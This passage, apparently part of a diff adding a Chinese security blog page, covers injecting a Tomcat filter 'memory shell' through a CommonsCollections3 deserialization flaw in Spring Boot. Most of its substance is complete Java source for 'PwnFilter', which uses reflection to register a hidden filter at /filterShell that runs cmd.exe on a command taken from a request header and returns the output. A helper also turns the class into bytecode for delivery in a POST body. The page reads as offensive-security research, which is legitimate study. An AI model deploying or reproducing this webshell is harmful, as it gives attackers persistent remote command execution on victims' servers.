&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时将内存马的字节码放在POST数据体里：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PwnFilter</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Filter &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequestField.get(<span class="literal">null</span>);<span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)context1.get(applicationContext);</span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">PwnFilter</span>());</span><br><span class="line">            filterDef.setFilterName(<span class="string">&quot;filterShell&quot;</span>);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.setFilterName(<span class="string">&quot;filterShell&quot;</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/filterShell&quot;</span>);</span><br><span class="line">            standardContext.addFilterMap(filterMap);</span><br><span class="line">            standardContext.filterStart();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ((RequestFacade)request).getHeader(<span class="string">&quot;Twings&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes();</span><br><span class="line">            response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(result));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要读取字节码然后BASE64一下方便传输：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(PwnFilter.class.getName());</span><br><span class="line">    <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/12494">Tomcat反序列化注入回显内存马</a></p>
+<p><a href="https://xz.aliyun.com/t/9755">Shiro反序列化与Tomcat内存马注入学习</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2023/05/08/%E5%85%B3%E4%BA%8EJava9%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84defineClass%E5%92%8CTemplatesImpl%E7%B1%BB%E7%9A%84%E9%97%AE%E9%A2%98/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>关于Java9环境下的defineClass和TemplatesImpl类的问题</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2023/05/04/Dubbo-generic-invoke%E6%BC%8F%E6%B4%9E2/">
+                        <span>Dubbo generic invoke漏洞2</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "借助CC3反序列化漏洞注入Spring Boot Filter内存马&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
